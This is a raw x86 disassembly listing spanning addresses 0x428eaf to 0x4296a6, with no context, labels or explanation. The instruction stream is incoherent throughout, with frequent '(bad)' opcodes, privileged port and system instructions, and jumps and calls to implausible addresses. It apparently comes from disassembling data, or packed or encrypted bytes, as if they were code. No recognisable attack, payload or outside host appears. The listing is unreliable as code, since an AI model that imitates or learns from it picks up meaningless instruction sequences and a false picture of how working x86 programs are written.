  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
